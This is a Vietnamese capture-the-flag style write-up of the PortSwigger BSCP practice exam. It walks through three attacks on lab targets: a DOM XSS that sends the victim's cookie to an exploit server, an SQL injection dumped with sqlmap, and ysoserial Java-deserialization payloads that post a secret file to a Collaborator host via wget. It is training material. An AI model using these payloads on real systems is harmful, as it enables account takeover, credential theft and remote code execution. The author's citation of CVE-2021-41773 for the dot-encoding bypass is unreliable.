# Write-up for Burp Suite Certified Practitioner Practice Exam

Author: `HoangNCH`

### 1. Khai thác DOM-based XSS tại chức năng "Search the blog":

##### a) Initial reconnaissance:

- Sử dụng DOM Invader để inject canary vào form, ta phát hiện được các source và sink như sau:

![image-20211213222734274](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213222734274.png)

- Trong đó có sink chứa hàm `eval` có thể chạy được script js, còn source nằm ở hàm `location.search` sẽ đọc nội dung phần querystring của url hiện tại (`?query=xss2%27"<>`), click vào stack trace để xem sink và source nằm ở đâu trong js code:

```javascript
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);  // sink
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);				 // source
    xhr.send();

    function displaySearchResults(searchResultsObj) {
        var blogHeader = document.getElementsByClassName("blog-header")[0];
        var blogList = document.getElementsByClassName("blog-list")[0];
        var searchTerm = searchResultsObj.searchTerm
        var searchResults = searchResultsObj.results

        var h1 = document.createElement("h1");
        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
        ...
}

```

- `window.location.search` có thể lấy data tùy ý mà ta nhập vào từ url parameter `query`, sau đó khi `xhr.send()` thì hàm `xhr.onreadystatechange` sẽ chạy, dẫn đến biến `searchResultsObj` được khởi tạo và được gán bằng response của server khi request `"GET", path + window.location.search` được gửi. Vấn đề là chúng ta chưa biết `path` là gì. Tìm trong HTTP History của Burp Suite ta có:

![image-20211213224603286](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213224603286.png)

- Như vậy `path=="/search"` và  `searchTerm=="xss2'"<>"`, chính là canary mà ta truyền vào. Response ở hình trên ở dạng JSON và do các kí tự truyền vào có `"` nên định dạng JSON bị lỗi, do đó mục `..search results for..` không hiện ra gì. Chúng ta cần phải escape nó.

##### b) Escape and bypass:

- Dùng payload `"+alert(1)}//` để escape JSON.

![image-20211213225524527](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213225524527.png)

- Do web app lại blacklist`document.cookie` nên ta chỉ có thể `alert(1)`:

![image-20211213225726052](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213225726052.png)

- Nhưng ta vẫn có thể bypass bằng cách dùng `document["cookie"]`:

![image-20211213225835470](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213225835470.png)

- Web app còn blacklist cả dấu `.`, vốn hay được dùng trong url. Thử payload `"+alert(' . ')}//`:

![image-20211213230124046](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213230124046.png)

- Nhưng chúng ta có thể url encode các dấu chấm thành `%2e` (CVE-2021-41773). Thử payload `"+(location="https://www%2ew3schools%2ecom/?a=1")}//`:

![image-20211213230633913](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213230633913.png)

##### 3) Exploit:

- Sử dụng exploit server của bài lab, tại `body` sử dụng script mẫu như sau:

```html
<script>
location='https://<lab id>.web-security-academy.net/?query=%22%2B%28location%3D%22https%3A%2F%2Fexploit-<exloit server id>%252eweb-security-academy%252enet%2F%2F%3Fcookie%3D%22%2Bdocument%5B%22cookie%22%5D%29%7D%2F%2F';
</script>
```

- Sau khi bấm `deliver exploit to victim` rồi `view exploit` thì vào `access log` kiểm tra:

![image-20211213231136699](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213231136699.png)

- Check access log chúng ta thấy một cookie "lạ", không phải nằm trên client side của chúng ta mà có lẽ là của victim (được highlight bên dưới):

![image-20211213231618624](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213231618624.png)

- Copy cookie này rồi thay thế cho cookie hiện tại thì ta chiếm được account `carlos`:

![image-20211213231748164](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213231748164.png)

### 2) Khai thác SQL Injection tại chức năng "Advanced search": 

##### a) Initial reconnaissance:

- Sau khi login vào thì chúng ta unlock được chức năng "Advanced search":
- Thử search tại API `GET /advanced_search` với url parameter `sort-by=DATE'`thì server bị lỗi SQL:

![image-20211213233720286](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213233720286.png)

- Như vậy web app chắc chắn bị SQLi, đồng thời ta biết được database mà nó đang sử dụng là **PostgreSQL**. Thử payload `(case when (1=0) then 2 else 1/0 end)` để comfirm có thể khai thác boolean-based SQLi.

##### b) SQLmap fuzzing:

- Sử dụng SQLmap với endpoint và url parameter đã biết bị dính SQLi là `sort-by` (đánh dấu bằng dấu `*`): 

```bash
sqlmap -u "https://<lab-id>.web-security-academy.net/advanced_search?query=sql&sort-by=DATE*&BlogArtist=" --cookie="_lab=47%7cMC0CFQCIke9NEAbxqv63GhR%2bSJBXBrPoOgIUW8U8i7A8lWst7ZEjpcYY0yWeY5vTzJLtnakt2%2fXCVQv%2fRHNcmnuzMElPQJ3nNX%2bnY9swdX11KiKAG9ji90bBZHprV07d4B8ImNY0Z4BEe4Lwe73XC9lvDudBWTDbWaVOnqT4f1jVQ9IJ; session=oVXI3YjjITIgfOP1LCsG2fp6zCpZVKOS" --dump
```

![image-20211214095628881](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211214095628881.png)

![image-20211214102141470](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211214102141470.png)

![image-20211214103312460](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211214103312460.png)

- Sau khi enumerate bằng SQLmap thì có được current database là `public`, có 1 table "khả nghi" là `users`, thử dump table này thì thấy nó có 2 column là `username` và `password`. Do đó tiếp tục dùng lệnh SQLmap sau để dump 2 column kia:

```bash
sqlmap -u "https://<lab-id>.web-security-academy.net/advanced_search?query=sql&sort-by=DATE*&BlogArtist=" --cookie="_lab=47%7cMC0CFQCIke9NEAbxqv63GhR%2bSJBXBrPoOgIUW8U8i7A8lWst7ZEjpcYY0yWeY5vTzJLtnakt2%2fXCVQv%2fRHNcmnuzMElPQJ3nNX%2bnY9swdX11KiKAG9ji90bBZHprV07d4B8ImNY0Z4BEe4Lwe73XC9lvDudBWTDbWaVOnqT4f1jVQ9IJ; session=oVXI3YjjITIgfOP1LCsG2fp6zCpZVKOS" --dump -D public -T users -C username,password
```

![image-20211214105324719](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211214105324719.png)

- Lấy được `administrator | cjbnksa6guo0y4a96o04 `, account có role admin do đó chúng ta có thể unlock được chức năng "Admin panel":

![image-20211214105637238](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211214105637238.png)

### 3) Khai thác java deserialization tại chức năng "Admin panel":

##### a) Initial reconnaissance:

- Để ý thấy khi vào chức năng này thì tại client side chúng ta được cấp cho một cookie là "admin-prefs":

![image-20211214112246704](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211214112246704.png)

- Nếu thay đổi cookie này tùy ý thì:

![image-20211214233523121](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211214233523121.png)

- Decode này bằng **Decoder** của Burp Suite ta biết được quá trình encode của cookie sau khi serialize là : gzip encode -->  base64 encode --> url encode:

![image-20211214123526651](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211214123526651.png)

- Trong plain text trên có đoạn `lab.display.admin.prefs.JavaPrefsCookieStrategy`. Nhiều khả năng web app này sẽ bị dính vuln **java deserialization** tại cookie  `admin-prefs` này.

##### b) Create pre-built gadget chain with ysoserial and exploit:

- Sau khi thử tạo các gadget chain bằng tool [ysoserial](https://github.com/frohoff/ysoserial) theo sample như sau:

```bash
java -jar ysoserial-master-8eb5cbfbf6-1.jar <payload types> '[command]' | gzip -f | base64 -w0
```

![image-20211215154314051](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211215154314051.png)

- Ta phát hiện có một payload type có thể dùng được là **CommonsCollections6** vì nó trả về status code 200, trong khi các payload type khác đều trả về status code 500 và **ClassNotFoundException** (các payload type khác có thể có exception khác, dùng phương pháp thử rồi loại suy thông qua exeption để tìm ra payload type phù hợp). 

```bash
java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections4 'curl https://<burp colab id>.burpcollaborator.net' | gzip -f | base64 -w0
```

###### Kết quả:

![image-20211214173728534](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211214173728534.png)

```bash
java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections6 'curl -X POST -d Hello https://<burp colab id>.burpcollaborator.net' | gzip -f | base64 -w0
```

###### Kết quả:

![image-20211215153848790](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211215153848790.png)

![image-20211215163312473](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211215163312473.png)

- Điều này có nghĩa là gadget chain tạo với payload type **CommonsCollections6** là hợp lệ và chúng ta có thể RCE thông qua gadget chain này. tạo payload như trong hình:

```bash
java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections6 'wget --post-file /home/carlos/secret c2ft9nahenbthexwc6hd0c9m4da3ys.burpcollaborator.net' | gzip -f | base64 -w0
```



![image-20211215154458664](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211215154458664.png)

- Lưu ý trước khi cho payload trên vào cookie `admin-prefs` thì phải URL encode nó:

![image-20211215154844486](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211215154844486.png)

- Cuối cùng thì chúng ta gửi request và poll Burp Collaborator Client và đợi kết quả:

![image-20211215155200561](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211215155200561.png)

###### Lưu ý: Cách khai thác Java Deserialize ở trên dựa vào bài lab của PortSwigger là [Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons).

##### 4) Kết quả Practice Exam BSCP:

![image-20211215155436265](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211215155436265.png)

![image-20211215155444115](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211215155444115.png)

![image-20211215165432252](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211215165432252.png)

